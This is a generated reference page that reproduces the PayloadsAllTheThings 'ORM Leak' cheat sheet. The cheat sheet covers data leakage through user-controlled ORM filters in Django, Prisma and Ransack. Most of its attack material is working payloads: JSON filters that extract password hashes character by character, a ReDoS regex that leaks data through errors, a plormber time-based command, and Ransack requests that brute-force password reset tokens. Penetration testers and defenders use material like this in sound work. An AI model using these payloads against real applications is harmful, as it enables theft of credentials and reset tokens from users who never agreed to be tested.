---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# ORM Leak

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-orm-leak-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/ORM Leak/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ORM Leak](../../topics/orm-leak/orm-leak.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-orm-leak-readme |
| name | ORM Leak |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/ORM%20Leak/README.md |

## Preserved Source Material

````yaml
_body: "# ORM Leak\n\n> An ORM leak vulnerability occurs when sensitive information, such as database structure or user data,\
  \ is unintentionally exposed due to improper handling of ORM queries. This can happen if the application returns raw error\
  \ messages, debug information, or allows attackers to manipulate queries in ways that reveal underlying data.\n\n## Summary\n\
  \n* [Django (Python)](#django-python)\n    * [Query filter](#query-filter)\n    * [Relational Filtering](#relational-filtering)\n\
  \        * [One-to-One](#one-to-one)\n        * [Many-to-Many](#many-to-many)\n    * [Error-based leaking - ReDOS](#error-based-leaking---redos)\n\
  * [Prisma (Node.JS)](#prisma-nodejs)\n    * [Relational Filtering](#relational-filtering-1)\n        * [One-to-One](#one-to-one-1)\n\
  \        * [Many-to-Many](#many-to-many-1)\n* [Ransack (Ruby)](#ransack-ruby)\n* [CVE](#cve)\n* [References](#references)\n\
  \n## Django (Python)\n\nThe following code is a basic example of an ORM querying the database.\n\n```py\nusers = User.objects.filter(**request.data)\n\
  serializer = UserSerializer(users, many=True)\n```\n\nThe problem lies in how the Django ORM uses keyword parameter syntax\
  \ to build QuerySets. By utilizing the unpack operator (`**`), users can dynamically control the keyword arguments passed\
  \ to the filter method, allowing them to filter results according to their needs.\n\n### Query filter\n\nThe attacker can\
  \ control the column to filter results by.\nThe ORM provides operators for matching parts of a value. These operators can\
  \ utilize the SQL LIKE condition in generated queries, perform regex matching based on user-controlled patterns, or apply\
  \ comparison operators such as < and >.\n\n```json\n{\n  \"username\": \"admin\",\n  \"password__startswith\": \"p\"\n}\n\
  ```\n\nInteresting filter to use:\n\n* `__startswith`\n* `__contains`\n* `__regex`\n\n### Relational Filtering\n\nLet's\
  \ use this great example from [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)\n\
  ![UML-example-app-simplified-highlight](https://www.elttam.com/assets/images/blog/2024-06-24-plormbing-your-django-orm/UML-example-app-simplified-highlight1.png)\n\
  \nWe can see 2 type of relationships:\n\n* One-to-One relationships\n* Many-to-Many Relationships\n\n#### One-to-One\n\n\
  Filtering through user that created an article, and having a password containing the character `p`.\n\n```json\n{\n  \"\
  created_by__user__password__contains\": \"p\"\n}\n```\n\n#### Many-to-Many\n\nAlmost the same thing but you need to filter\
  \ more.\n\n* Get the user IDS: `created_by__departments__employees__user__id`\n* For each ID, get the username: `created_by__departments__employees__user__username`\n\
  * Finally, leak their password hash: `created_by__departments__employees__user__password`\n\nUse multiple filters in the\
  \ same request:\n\n```json\n{\n  \"created_by__departments__employees__user__username__startswith\": \"p\",\n  \"created_by__departments__employees__user__id\"\
  : 1\n}\n```\n\n### Error-based leaking - ReDOS\n\nIf Django use MySQL, you can also abuse a ReDOS to force an error when\
  \ the filter does not properly match the condition.\n\n```json\n{\"created_by__user__password__regex\": \"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$\"\
  }\n// => Return something\n\n{\"created_by__user__password__regex\": \"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$\"}  \n// => Error\
  \ 500 (Timeout exceeded in regular expression match)\n```\n\n## Prisma (Node.JS)\n\n**Tools**:\n\n* [elttam/plormber](https://github.com/elttam/plormber)\
  \ - tool for exploiting ORM Leak time-based vulnerabilities\n\n    ```ps1\n    plormber prisma-contains \\\n        --chars\
  \ '0123456789abcdef' \\\n        --base-query-json '{\"query\": {PAYLOAD}}' \\\n        --leak-query-json '{\"createdBy\"\
  : {\"resetToken\": {\"startsWith\": \"{ORM_LEAK}\"}}}' \\\n        --contains-payload-json '{\"body\": {\"contains\": \"\
  {RANDOM_STRING}\"}}' \\\n        --verbose-stats \\\n        https://some.vuln.app/articles/time-based;\n    ```\n\n**Example**:\n\
  \nExample of an ORM leak in Node.JS with Prisma.\n\n```js\nconst posts = await prisma.article.findMany({\n  where: req.query.filter\
  \ as any // Vulnerable to ORM Leaks\n})\n```\n\nUse the include to return all the fields of user records that have created\
  \ an article\n\n```json\n{\n  \"filter\": {\n    \"include\": {\n      \"createdBy\": true\n    }\n  }\n}\n```\n\nSelect\
  \ only one field\n\n```json\n{\n  \"filter\": {\n    \"select\": {\n      \"createdBy\": {\n        \"select\": {\n    \
  \      \"password\": true\n        }\n      }\n    }\n  }\n}\n```\n\n### Relational Filtering\n\n#### One-to-One\n\n* [`filter[createdBy][resetToken][startsWith]=06`](http://127.0.0.1:9900/articles?filter[createdBy][resetToken][startsWith]=)\n\
  \n#### Many-to-Many\n\n```json\n{\n  \"query\": {\n    \"createdBy\": {\n      \"departments\": {\n        \"some\": {\n\
  \          \"employees\": {\n            \"some\": {\n              \"departments\": {\n                \"some\": {\n  \
  \                \"employees\": {\n                    \"some\": {\n                      \"departments\": {\n         \
  \               \"some\": {\n                          \"employees\": {\n                            \"some\": {\n     \
  \                         \"{fieldToLeak}\": {\n                                \"startsWith\": \"{testStartsWith}\"\n \
  \                             }\n                            }\n                          }\n                        }\n\
  \                      }\n                    }\n                  }\n                }\n              }\n            }\n\
  \          }\n        }\n      }\n    }\n  }\n}\n```\n\n## Ransack (Ruby)\n\nOnly in Ransack < `4.0.0`.\n\n![ransack_bruteforce_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)\n\
  \n* Extracting the `reset_password_token` field of a user\n\n    ```ps1\n    GET /posts?q[user_reset_password_token_start]=0\
  \ -> Empty results page\n    GET /posts?q[user_reset_password_token_start]=1 -> Empty results page\n    GET /posts?q[user_reset_password_token_start]=2\
  \ -> Results in page\n\n    GET /posts?q[user_reset_password_token_start]=2c -> Empty results page\n    GET /posts?q[user_reset_password_token_start]=2f\
  \ -> Results in page\n    ```\n\n* Target a specific user and extract his `recoveries_key`\n\n    ```ps1\n    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0\n\
  \    ```\n\n## CVE\n\n* [CVE-2023-47117: Label Studio ORM Leak](https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw)\n\
  * [CVE-2023-31133: Ghost CMS ORM Leak](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)\n* [CVE-2023-30843:\
  \ Payload CMS ORM Leak](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)\n\n## References\n\
  \n* [ORM Injection - HackTricks - July 30, 2024](https://web.archive.org/web/20241230091620/https://book.hacktricks.xyz/pentesting-web/orm-injection)\n\
  * [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://web.archive.org/web/20260118225011/https://pentesterlab.com/blog/orm-leak-with-sqlite3)\n\
  * [ORM Leaking More Than You Joined For - Alex Brown - December 18, 2025](https://web.archive.org/web/20251218130815/https://www.elttam.com/blog/leaking-more-than-you-joined-for/)\n\
  * [plORMbing your Django ORM - Alex Brown - June 24, 2024](https://web.archive.org/web/20240624071414/https://www.elttam.com/blog/plormbing-your-django-orm/)\n\
  * [plORMbing your Prisma ORM with Time-based Attacks - Alex Brown - July 9, 2024](https://web.archive.org/web/20240709043351/https://www.elttam.com/blog/plorming-your-primsa-orm/)\n\
  * [QuerySet API reference - Django - August 8, 2024](https://web.archive.org/web/20240625055642/https://docs.djangoproject.com/en/5.1/ref/models/querysets/)\n\
  * [Ransacking your password reset tokens - Lukas Euler - January 26, 2023](https://web.archive.org/web/20251211204930/https://positive.security/blog/ransack-data-exfiltration)"
_relative_path: ORM Leak/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/ORM Leak/README.md
````
